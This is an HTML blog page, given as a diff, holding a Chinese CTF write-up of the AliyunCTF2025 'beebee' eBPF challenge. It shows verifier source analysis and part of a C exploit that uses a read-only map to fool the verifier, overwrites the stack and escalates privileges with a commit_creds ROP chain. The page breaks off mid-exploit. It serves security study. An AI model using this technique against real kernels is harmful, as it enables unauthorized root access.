@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
+        
+      <meta name="description" content="Boom? PWN ! ! !" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>Dig into ebpf (一)  —— AliyunCTF2025 beebee |  北极落小雪</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+  </html>
+</html>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Dig into ebpf(1)"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Dig into ebpf (一)  —— AliyunCTF2025 beebee
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2025/Dig%20into%20ebpf(1)/" class="article-date">
+  <time datetime="2025-04-11T16:00:00.000Z" itemprop="datePublished">2025-04-12</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/Kernel/">Kernel</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">10 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>拖了一年之后终于开始接触ebpf了, 但ebpf的verifier细节太多, 直接上源码分析工作量太大, 正好这道beebee不太需要理解verifier的细节hh.</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目添加了一个helper函数, 作用实质是一个内存写8字节原语. 由于res指针具有MEM_RDONLY标志, 意味着这可以改写到一些只读内存. (从bpf_aliyunctf_xor的实现可以看出来, 这个”只读”的概念是基于ebpf层面而不是页面权限层面)</p>
+<span id="more"></span>
+
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* MEM_RDONLY -- MEM is read-only. When applied on bpf_arg, it indicates the arg is</span></span><br><span class="line"><span class="comment"> * compatible with both mutable and immutable memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* ARG_PTR_TO_MEM -- pointer to valid memory (stack, packet, map value) */</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_proto</span> <span class="title">bpf_aliyunctf_xor_proto</span> =</span> {</span><br><span class="line">	.func		= bpf_aliyunctf_xor,</span><br><span class="line">	.gpl_only	= <span class="literal">false</span>,</span><br><span class="line">	.ret_type	= RET_INTEGER,</span><br><span class="line">	.arg1_type	= ARG_PTR_TO_MEM | MEM_RDONLY,</span><br><span class="line">	.arg2_type	= ARG_CONST_SIZE,</span><br><span class="line">	.arg3_type	= ARG_PTR_TO_FIXED_SIZE_MEM | MEM_UNINIT | MEM_ALIGNED | MEM_RDONLY,</span><br><span class="line">	.arg3_size	= <span class="keyword">sizeof</span>(s64),</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">BPF_CALL_3(bpf_aliyunctf_xor, <span class="type">const</span> <span class="type">char</span> *, buf, <span class="type">size_t</span>, buf_len, s64 *, res) {</span><br><span class="line">	s64 _res = <span class="number">2025</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (buf_len != <span class="keyword">sizeof</span>(s64))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	_res ^= *(s64 *)buf;</span><br><span class="line">	*res = _res;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>改写只读内存的原语如何利用? 首先想到的是改写一些敏感数据, 比如用户态利用字符串表符号表的操作. 但ARG_PTR_TO_MEM的类型其实只能指向stack,packet, map value, 而这些数据其实在合法范围内都是非敏感的.</p>
+<p>于是回到ebpf exploit的经典思路 —— 欺骗verifier. 如果verifier将RDONLY内存中读取的值认为是定值, 而我们通过该helper方法修改它, 这就能造成verifier与运行时不一致的情况.</p>
+<p>首先尝试在kernel/bpf目录下搜索MEM_RDONLY, 但并没有找到verifier对该标志内存访问的特殊处理. 转而搜索RDONLY, 找到bpf_map_is_rdonly函数. </p>
+<p>从注释中得知, 如果map</p>
+<ul>
+<li>在创建时指定了<code>BPF_F_RDONLY_PROG</code>标志(程序侧无法修改)</li>
+<li>在用户空间进行了初始化并被frozen(用户侧无法修改)</li>
+<li>所有并行/未完成的更新操作已经完成</li>
+</ul>
+<p>则该map是只读的.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">bpf_map_is_rdonly</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> bpf_map *<span class="built_in">map</span>)</span></span><br><span class="line">{</span><br><span class="line">	<span class="comment">/* A map is considered read-only if the following condition are true:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * 1) BPF program side cannot change any of the map content. The</span></span><br><span class="line"><span class="comment">	 *    BPF_F_RDONLY_PROG flag is throughout the lifetime of a map</span></span><br><span class="line"><span class="comment">	 *    and was set at map creation time.</span></span><br><span class="line"><span class="comment">	 * 2) The map value(s) have been initialized from user space by a</span></span><br><span class="line"><span class="comment">	 *    loader and then "frozen", such that no new map update/delete</span></span><br><span class="line"><span class="comment">	 *    operations from syscall side are possible for the rest of</span></span><br><span class="line"><span class="comment">	 *    the map's lifetime from that point onwards.</span></span><br><span class="line"><span class="comment">	 * 3) Any parallel/pending map update/delete operations from syscall</span></span><br><span class="line"><span class="comment">	 *    side have been completed. Only after that point, it's safe to</span></span><br><span class="line"><span class="comment">	 *    assume that map value(s) are immutable.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="built_in">map</span>-&gt;map_flags &amp; BPF_F_RDONLY_PROG) &amp;&amp;</span><br><span class="line">	       READ_ONCE(<span class="built_in">map</span>-&gt;frozen) &amp;&amp;</span><br><span class="line">	       !bpf_map_write_active(<span class="built_in">map</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查找交叉引用, 找到check_mem_access函数中与我们预期情况相符的特殊处理, 将value_reg标记为vefify时的已知值.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* check whether memory at (regno + off) is accessible for t = (read | write)</span></span><br><span class="line"><span class="comment"> * if t==write, value_regno is a register which value is stored into memory</span></span><br><span class="line"><span class="comment"> * if t==read, value_regno is a register which will receive the value from memory</span></span><br><span class="line"><span class="comment"> * if t==write &amp;&amp; value_regno==-1, some unknown value is stored into memory</span></span><br><span class="line"><span class="comment"> * if t==read &amp;&amp; value_regno==-1, don't care what we read from memory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">check_mem_access</span><span class="params">(<span class="keyword">struct</span> bpf_verifier_env *env, <span class="type">int</span> insn_idx, u32 regno,</span></span><br><span class="line"><span class="params">			    <span class="type">int</span> off, <span class="type">int</span> bpf_size, <span class="keyword">enum</span> bpf_access_type t,</span></span><br><span class="line"><span class="params">			    <span class="type">int</span> value_regno, <span class="type">bool</span> strict_alignment_once, <span class="type">bool</span> is_ldsx)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">		} <span class="keyword">else</span> <span class="keyword">if</span> (t == BPF_READ &amp;&amp; value_regno &gt;= <span class="number">0</span>) {</span><br><span class="line">			<span class="keyword">struct</span> bpf_map *<span class="built_in">map</span> = reg-&gt;map_ptr;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* if map is read-only, track its contents as scalars */</span></span><br><span class="line">			<span class="keyword">if</span> (tnum_is_const(reg-&gt;var_off) &amp;&amp;</span><br><span class="line">			    bpf_map_is_rdonly(<span class="built_in">map</span>) &amp;&amp;</span><br><span class="line">			    <span class="built_in">map</span>-&gt;ops-&gt;map_direct_value_addr) {</span><br><span class="line">				<span class="type">int</span> map_off = off + reg-&gt;var_off.value;</span><br><span class="line">				u64 val = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">				err = bpf_map_direct_read(<span class="built_in">map</span>, map_off, size,</span><br><span class="line">							  &amp;val, is_ldsx);</span><br><span class="line">				<span class="keyword">if</span> (err)</span><br><span class="line">					<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">				regs[value_regno].type = SCALAR_VALUE;</span><br><span class="line">				__mark_reg_known(&amp;regs[value_regno], val);</span><br><span class="line">			} <span class="keyword">else</span> {</span><br><span class="line">				mark_reg_unknown(env, regs, value_regno);</span><br><span class="line">			}</span><br><span class="line">		}</span><br><span class="line">......</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>于是思路明确了, 首先创建一个只读的map, 保存一个offset(初始设为0). 通过helper将这个offset改为一个可以越界的偏移, 然后将skb中保存的ROP链复制到当前栈帧加上该offset的位置, 由于map只读且offset的初值为0, 所以verifier会认为这次写入是在合法范围内的.<br>通过这样的方式即可覆盖返回地址ROP提权.</p>
+<p>不过还是确认一下源码中STX到栈的相关范围检查</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">} <span class="keyword">else</span> <span class="keyword">if</span> (reg-&gt;type == PTR_TO_STACK) {</span><br><span class="line">	<span class="comment">/* Basic bounds checks. */</span></span><br><span class="line">	err = check_stack_access_within_bounds(env, regno, off, size, ACCESS_DIRECT, t);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t == BPF_READ)</span><br><span class="line">		err = check_stack_read(env, regno, off, size,</span><br><span class="line">				       value_regno);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		err = check_stack_write(env, regno, off, size,</span><br><span class="line">					value_regno, insn_idx);</span><br></pre></td></tr></tbody></table></figure>
+
+
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check that the stack access at 'regno + off' falls within the maximum stack</span></span><br><span class="line"><span class="comment"> * bounds.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 'off' includes `regno-&gt;offset`, but not its dynamic part (if any).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">check_stack_access_within_bounds</span><span class="params">(</span></span><br><span class="line"><span class="params">		<span class="keyword">struct</span> bpf_verifier_env *env,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> regno, <span class="type">int</span> off, <span class="type">int</span> access_size,</span></span><br><span class="line"><span class="params">		<span class="keyword">enum</span> bpf_access_src src, <span class="keyword">enum</span> bpf_access_type type)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">regs</span> =</span> cur_regs(env);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">reg</span> =</span> regs + regno;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_func_state</span> *<span class="title">state</span> =</span> func(env, reg);</span><br><span class="line">	s64 min_off, max_off;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line">	<span class="type">char</span> *err_extra;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (src == ACCESS_HELPER)</span><br><span class="line">		<span class="comment">/* We don't know if helpers are reading or writing (or both). */</span></span><br><span class="line">		err_extra = <span class="string">" indirect access to"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (type == BPF_READ)</span><br><span class="line">		err_extra = <span class="string">" read from"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		err_extra = <span class="string">" write to"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tnum_is_const(reg-&gt;var_off)) {</span><br><span class="line">	<span class="comment">// 如果reg的偏移是常量, 那么访问范围就是[value+off,value+off+access_size)</span></span><br><span class="line">		min_off = (s64)reg-&gt;var_off.value + off;</span><br><span class="line">		max_off = min_off + access_size;</span><br><span class="line">	} <span class="keyword">else</span> {</span><br><span class="line">	<span class="comment">// 否则用smin_value/smax_value来算范围</span></span><br><span class="line">		<span class="keyword">if</span> (reg-&gt;smax_value &gt;= BPF_MAX_VAR_OFF ||</span><br><span class="line">		    reg-&gt;smin_value &lt;= -BPF_MAX_VAR_OFF) {</span><br><span class="line">			verbose(env, <span class="string">"invalid unbounded variable-offset%s stack R%d\n"</span>,</span><br><span class="line">				err_extra, regno);</span><br><span class="line">			<span class="keyword">return</span> -EACCES;</span><br><span class="line">		}</span><br><span class="line">		min_off = reg-&gt;smin_value + off;</span><br><span class="line">		max_off = reg-&gt;smax_value + off + access_size;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据[min_off,max_off]h和access判断本次读取是否合法</span></span><br><span class="line">	err = check_stack_slot_within_bounds(env, min_off, state, type);</span><br><span class="line">	<span class="keyword">if</span> (!err &amp;&amp; max_off &gt; <span class="number">0</span>)</span><br><span class="line">		err = -EINVAL; <span class="comment">/* out of stack access into non-negative offsets */</span></span><br><span class="line">	<span class="keyword">if</span> (!err &amp;&amp; access_size &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="comment">/* access_size should not be negative (or overflow an int); others checks</span></span><br><span class="line"><span class="comment">		 * along the way should have prevented such an access.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		err = -EFAULT; <span class="comment">/* invalid negative access size; integer overflow? */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err) {</span><br><span class="line">		<span class="keyword">if</span> (tnum_is_const(reg-&gt;var_off)) {</span><br><span class="line">			verbose(env, <span class="string">"invalid%s stack R%d off=%d size=%d\n"</span>,</span><br><span class="line">				err_extra, regno, off, access_size);</span><br><span class="line">		} <span class="keyword">else</span> {</span><br><span class="line">			<span class="type">char</span> tn_buf[<span class="number">48</span>];</span><br><span class="line"></span><br><span class="line">			tnum_strn(tn_buf, <span class="keyword">sizeof</span>(tn_buf), reg-&gt;var_off);</span><br><span class="line">			verbose(env, <span class="string">"invalid variable-offset%s stack R%d var_off=%s size=%d\n"</span>,</span><br><span class="line">				err_extra, regno, tn_buf, access_size);</span><br><span class="line">		}</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增长已分配栈到-min_off</span></span><br><span class="line">	<span class="keyword">return</span> grow_stack_state(env, state, round_up(-min_off, BPF_REG_SIZE));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>check_stack_slot_within_bounds限制读写的范围在栈内, 且根据allow_uinit_stack来判断是否需要限制未分配的栈空间读取.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check that the stack access at the given offset is within bounds. The</span></span><br><span class="line"><span class="comment"> * maximum valid offset is -1.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The minimum valid offset is -MAX_BPF_STACK for writes, and</span></span><br><span class="line"><span class="comment"> * -state-&gt;allocated_stack for reads.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">check_stack_slot_within_bounds</span><span class="params">(<span class="keyword">struct</span> bpf_verifier_env *env,</span></span><br><span class="line"><span class="params">                                          s64 off,</span></span><br><span class="line"><span class="params">                                          <span class="keyword">struct</span> bpf_func_state *state,</span></span><br><span class="line"><span class="params">                                          <span class="keyword">enum</span> bpf_access_type t)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">int</span> min_valid_off;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t == BPF_WRITE || env-&gt;allow_uninit_stack)</span><br><span class="line">		min_valid_off = -MAX_BPF_STACK;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		min_valid_off = -state-&gt;allocated_stack;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (off &lt; min_valid_off || off &gt; <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> -EACCES;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>明确思路后编写exp, 调试主要是看verifier的报错信息, 以及直接调试jit编译出来的机器码.<br>例如下图即为map不为只读的情况下, 读出的offset会被认为是无界值, 而无界值与指针的运算是不允许的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20250412192617.png"></p>
+<h3 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1"></a>EXP1</h3><p>在root用户下调完exp后, 切换到普通用户测试, 正准备收工的笔者发现, exp1在普通用户下没法提权.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;kernelpwn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"bpf.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> map_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">initMap</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        <span class="keyword">sizeof</span>(<span class="type">int</span>), <span class="keyword">sizeof</span>(<span class="type">int64_t</span>), <span class="number">1</span>, BPF_F_RDONLY_PROG);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> value = <span class="number">0</span>;</span><br><span class="line">    bpf_update_elem(map_fd, &amp;key, &amp;value, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> err = bpf_map_freeze(map_fd);</span><br><span class="line">    <span class="keyword">if</span>(err == <span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">        loge(<span class="string">"bpf(BPF_MAP_FREEZE):%s"</span>,bpf_log_buf);</span><br><span class="line">        err_exit(<span class="string">"BPF_MAP_FREEZE"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810c1c60</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82a52fa0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c19b0</span>;</span><br><span class="line"><span class="type">size_t</span> do_sys_vfork = <span class="number">0xffffffff8108d2f0</span>;</span><br><span class="line"><span class="type">size_t</span> msleep = <span class="number">0xffffffff8113dfd0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi = <span class="number">0xffffffff81142d79</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_FUNC_aliyunctf_xor 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RETADDR_OFFSET 0x28</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    initMap();</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> ropchain[] = {</span><br><span class="line">        pop_rdi,</span><br><span class="line">        init_cred,</span><br><span class="line">        commit_creds,</span><br><span class="line">        do_sys_vfork</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> {</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, <span class="number">0xdeadbeef</span>),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// reg9: offset</span></span><br><span class="line">        <span class="comment">// reg6: map_fd</span></span><br><span class="line">        <span class="comment">// reg8: skb</span></span><br><span class="line"></span><br><span class="line">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),</span><br><span class="line">        BPF_LD_MAP_FD(BPF_REG_6, map_fd),</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-8</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),</span><br><span class="line">        BPF_ALU64_IMM(BPF_ADD,BPF_REG_2,<span class="number">-8</span>),</span><br><span class="line">        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),</span><br><span class="line">        BPF_MOV64_REG(BPF_REG_7,BPF_REG_0),</span><br><span 